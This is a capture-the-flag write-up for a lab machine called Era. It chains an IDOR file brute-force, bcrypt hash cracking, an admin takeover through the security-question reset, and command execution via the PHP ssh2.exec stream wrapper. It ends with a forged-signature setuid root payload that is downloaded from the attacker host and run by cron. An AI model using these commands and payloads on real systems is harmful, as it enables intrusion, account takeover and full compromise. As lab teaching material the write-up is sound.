# IDOR on file IDs

I'll grab my session cookie from the browser (Application tab → Cookies, or Burp) and brute-force the `id` parameter across a wide numeric range. First I check the size of a "File Not Found" response so I can filter it out with `-fs`:

```bash
curl -s -H 'Cookie: PHPSESSID=<paste your PHPSESSID here>' 'http://file.era.htb/download.php?id=999999&dl=true' | wc -c
```

That gives me the baseline size to exclude, then the actual sweep:

```bash
seq 1 5000 > ids.txt
ffuf -u 'http://file.era.htb/download.php?id=FUZZ&dl=true' \
     -H 'Cookie: PHPSESSID=<paste your PHPSESSID here>' \
     -w ids.txt \
     -fs <paste the baseline size from above>
```

This turns up two IDs that aren't mine: `54` and `150`. ID `54` downloads as a zipped site backup — full source and a database. ID `150` downloads a small zip with two files inside, `key.pem` and `x509.genkey`. I don't know what those are for yet, but a private key and a cert config sitting in a random file upload is the kind of thing that tends to matter later, so I'm keeping it.

## Reading the source

Unzipping the site backup gives the whole PHP app. The interesting file is `reset.php`, which handles the "Update Security Questions" form:

```php
$username = trim($_POST['username'] ?? '');
...
$query = "UPDATE users SET security_answer1 = ?, security_answer2 = ?, security_answer3 = ? WHERE user_name = ?";
$stmt = $db->prepare($query);
$stmt->bindValue(1, $new_answer1, SQLITE3_TEXT);
$stmt->bindValue(2, $new_answer2, SQLITE3_TEXT);
$stmt->bindValue(3, $new_answer3, SQLITE3_TEXT);
$stmt->bindValue(4, $username, SQLITE3_TEXT);
```

The query itself is parameterized, so it's not injectable — but look at where `$username` comes from. It's a raw field from the POST body, and it's never checked against the logged-in session. The form is supposed to let me update *my own* security questions, but there's nothing stopping me from putting any other username in that field and overwriting *their* answers instead. That's an authorization bug wearing an SQL-safe costume — the query is fine, the logic around it isn't.

## The database

The backup also has `filedb.sqlite`. Dumping the `users` table:

```bash
sqlite3 filedb.sqlite "SELECT * FROM users;"
```

Six accounts. One of them, `admin_ef01cab31aa`, has `user_id = 1` — almost certainly the privileged account. The password hashes are bcrypt, so a wordlist crack is worth a shot:

```bash
hashcat -m 3200 --username hashes.txt /usr/share/wordlists/rockyou.txt
```

Two fall quickly — `eric:america` and `yuri:mustang`. Admin's hash doesn't crack against rockyou, which is fine, because the reset bug above means I don't actually need its password.

## FTP, now that I have creds

Back to that FTP port from the initial scan — `yuri`'s password works there too:

```bash
ftp yuri@era.htb
```

Two directories: `apache2_conf` and `php8.1_conf`. The Apache configs are unremarkable. The PHP directory is more interesting — it's a full dump of loaded PHP extensions, `.so` files and all. Scanning through the list, `ssh2.so` stands out. That extension registers PHP stream wrappers like `ssh2.exec://`, which let PHP code open an SSH connection and execute a command as if it were reading a file. I don't have an immediate use for that yet, but knowing it's loaded is exactly the kind of detail worth remembering for later — stream-wrapper abuse is only interesting when you also control something that calls `fopen()` on user input.

# Turning the IDOR into admin access

Using the reset bug against `admin_ef01cab31aa`, I can post new security-question answers with that username in the form and they'll be silently overwritten — no proof of ownership required. From there, "Log in Using Security Questions" gets me in as admin.

Now that I'm logged in as the privileged user, it's worth re-reading `download.php` with that in mind — there was a branch I skipped past before that specifically checks for `$_SESSION['erauser'] === 1`:

```php
} elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
    $format = isset($_GET['format']) ? $_GET['format'] : '';
    $file = $fetched[0];

    if (strpos($format, '://') !== false) {
        $wrapper = $format;
    }
    ...
    $file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
```

This is a "beta" preview feature gated to the admin account only. It takes a `format` GET parameter, checks it for `://`, and if present, uses it directly as a prefix in an `fopen()` call — with the actual database file path tacked on the end. In other words, if `format` is any valid PHP stream wrapper, this endpoint will happily open it. This is exactly the shape of bug that the `ssh2.so` discovery on FTP was hinting at. The `ssh2.exec://` wrapper takes `user:pass@host:port/command` and runs the command over an SSH connection — I already have two working sets of Linux credentials from the hash cracking, and SSH doesn't even need to be exposed externally for this to work, since PHP is making the connection from the server itself, presumably to `127.0.0.1`.

## Confirming command execution

The database file path gets appended after whatever I put in `format`, so I need to terminate my injected command with a `;` before that junk lands:

```
GET /download.php?id=54&show=true&format=ssh2.exec://eric:america@127.0.0.1:22/ping+-c1+10.10.16.24;
```

With a listener up:

```bash
sudo tcpdump -i tun0 -v icmp
```

ICMP shows up. Command execution confirmed, blind but working.

# Privilege Escalation

```bash
eric@era:~$ id
uid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs)
```

`devs` isn't a default group, which makes it worth chasing down immediately. `sudo -l` comes back empty for both `eric` and `yuri`, so this is the only lead.

```bash
find / -group devs 2>/dev/null
```

```
/opt/AV
/opt/AV/periodic-checks
/opt/AV/periodic-checks/monitor
/opt/AV/periodic-checks/status.log
```

`monitor` is a root-owned ELF binary that the `devs` group can write to, and its mtime keeps changing every minute — a cron job is clearly touching it. I'll drop in `pspy` to see exactly what's happening instead of guessing:

```bash
./pspy64
```

```
CMD: UID=0 PID=xxxx | bash -c /root/initiate_monitoring.sh
CMD: UID=0 PID=xxxx | objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor
CMD: UID=0 PID=xxxx | grep -oP (?<=UTF8STRING        :)Era Inc.
```

So once a minute, root runs `initiate_monitoring.sh`, which pulls a custom ELF section called `.text_sig` out of `monitor` using `objcopy`, then greps fields out of it that look like they belong to a certificate — an org name, an email address. That's not a standard ELF section; someone built a custom "signed binary" scheme on top of a normal executable, presumably to stop exactly the kind of tampering I'm about to attempt. If the section is missing or doesn't check out, the script should refuse to run the binary.

I can confirm that refusal easily enough — dropping in a plain replacement binary with no `.text_sig` section at all gets rejected:

```
objcopy: /opt/AV/periodic-checks/monitor: file format not recognized
[ERROR] Executable not signed. Tampering attempt detected. Skipping.
```

So the check is real. The question is whether it's checking that the signature is valid *for this exact file*, or just checking that *a* valid signature exists somewhere in the binary. Those are very different levels of security, and given this is clearly a custom, home-rolled implementation rather than a standard OS mechanism, I'd bet on the weaker version — worth testing rather than assuming.

## Building a binary that carries a valid signature

This is where the `key.pem` and `x509.genkey` from the earlier IDOR find finally make sense — those are the private key and certificate template for whatever signing process produces `.text_sig`. If I have the key, I can sign my own binary the same way the legitimate one was signed.

First, a minimal payload that grants a root shell:

```c
#include <unistd.h>
#include <stdlib.h>

int main(void) {
    setuid(0); setgid(0); seteuid(0); setegid(0);
    system("cp /bin/bash /tmp/rootbash && chmod 6777 /tmp/rootbash");
}
```

```bash
gcc exploit.c -o exploit
```

Generate a certificate from the recovered key and config, then produce a CMS/PKCS#7 signature over the payload and embed it as `.text_sig`:

```bash
openssl req -new -x509 -key key.pem -out cert.pem -days 365 -config x509.genkey

openssl cms -sign -in exploit -signer cert.pem -inkey key.pem \
  -outform DER -out text_sig.der -nodetach -nosmimecap -nocerts -noattr

objcopy --add-section .text_sig=text_sig.der --set-section-flags .text_sig=readonly exploit
```

Upload it and overwrite `monitor`:

```bash
wget http://10.10.16.24/exploit -O monitor
chmod +x monitor
cp monitor /opt/AV/periodic-checks/monitor
```

Within a minute the cron fires, the signature check passes, and root executes it:

```bash
ls -l /tmp/rootbash
-rwsrwsrwx 1 root root ... /tmp/rootbash
```

```bash
/tmp/rootbash -p
```

Root shell, and `root.txt` is readable from `/root`.
